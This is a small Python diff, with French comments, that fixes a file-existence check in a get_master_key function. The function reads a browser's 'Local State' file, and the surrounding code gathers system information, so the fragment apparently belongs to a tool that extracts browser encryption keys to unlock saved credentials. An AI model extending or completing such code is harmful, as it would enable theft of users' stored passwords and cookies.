@@ -64,7 +64,7 @@ system_info = {
 
 # Fonctions pour la gestion des données des navigateurs
 def get_master_key(path: str):
-    if not os.path.exists(path):
+    if not os.path.exists(path + "\\Local State"):
         return None
     with open(path + "\\Local State", "r", encoding="utf-8") as f:
         local_state = json.loads(f.read())
